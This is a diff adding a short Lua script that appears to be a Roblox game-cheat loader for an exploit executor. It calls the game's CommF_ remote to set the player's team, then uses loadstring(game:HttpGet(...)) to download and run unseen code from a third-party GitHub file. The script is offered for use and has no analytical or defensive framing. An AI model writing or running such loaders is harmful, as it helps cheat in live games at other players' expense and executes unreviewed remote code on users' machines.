@@ -1,0 +1,10 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+
+if player.Team == nil then
+    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetTeam", getgenv().Team)
+end
+
+task.wait(3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenithWz/Rizeniii/refs/heads/main/Diamond"))()
